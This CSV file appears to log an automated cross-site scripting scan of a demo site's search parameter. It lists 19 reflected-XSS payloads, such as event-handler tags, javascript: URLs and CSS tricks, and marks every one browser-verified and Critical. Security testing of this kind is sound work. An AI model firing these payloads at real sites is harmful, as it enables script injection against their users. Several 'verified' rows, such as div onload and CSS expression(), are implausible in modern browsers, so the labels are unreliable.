Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 16:54:58.359,2026-01-10 16:54:58.499,0.141,https://demo-knsl.onrender.com/search,GET,q,<video src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:58.500,2026-01-10 16:54:58.626,0.127,https://demo-knsl.onrender.com/search,GET,q,<audio src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:58.627,2026-01-10 16:54:58.740,0.113,https://demo-knsl.onrender.com/search,GET,q,<video><source onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:58.740,2026-01-10 16:54:58.859,0.120,https://demo-knsl.onrender.com/search,GET,q,<link rel=stylesheet href=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:58.859,2026-01-10 16:54:58.978,0.119,https://demo-knsl.onrender.com/search,GET,q,<a href=javascript:alert(1)>click</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:58.978,2026-01-10 16:54:59.098,0.120,https://demo-knsl.onrender.com/search,GET,q,"<a href=""javascript:alert(1)"">click</a>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:59.098,2026-01-10 16:54:59.218,0.120,https://demo-knsl.onrender.com/search,GET,q,<form action=javascript:alert(1)><input type=submit>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:59.218,2026-01-10 16:54:59.339,0.121,https://demo-knsl.onrender.com/search,GET,q,<form><button formaction=javascript:alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:59.339,2026-01-10 16:54:59.467,0.127,https://demo-knsl.onrender.com/search,GET,q,<form><input formaction=javascript:alert(1) type=submit value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:59.467,2026-01-10 16:54:59.582,0.115,https://demo-knsl.onrender.com/search,GET,q,<meta http-equiv=refresh content=0;url=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:59.582,2026-01-10 16:54:59.705,0.123,https://demo-knsl.onrender.com/search,GET,q,"<meta http-equiv=refresh content=""0;javascript:alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:59.705,2026-01-10 16:54:59.834,0.130,https://demo-knsl.onrender.com/search,GET,q,<style>*{background:url('javascript:alert(1)')}</style>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:59.834,2026-01-10 16:54:59.941,0.107,https://demo-knsl.onrender.com/search,GET,q,<style>@import'javascript:alert(1)';</style>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:59.941,2026-01-10 16:55:00.041,0.100,https://demo-knsl.onrender.com/search,GET,q,<style onload=alert(1)></style>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:00.041,2026-01-10 16:55:00.140,0.099,https://demo-knsl.onrender.com/search,GET,q,<math><mi xlink:href=javascript:alert(1)>X</mi></math>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:00.140,2026-01-10 16:55:00.270,0.130,https://demo-knsl.onrender.com/search,GET,q,<table background=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:00.270,2026-01-10 16:55:00.391,0.121,https://demo-knsl.onrender.com/search,GET,q,<table><td background=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:00.391,2026-01-10 16:55:00.497,0.106,https://demo-knsl.onrender.com/search,GET,q,<div onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:00.497,2026-01-10 16:55:00.618,0.121,https://demo-knsl.onrender.com/search,GET,q,<div style=width:expression(alert(1))>,RAW_REFLECTION,Yes,alert,Critical
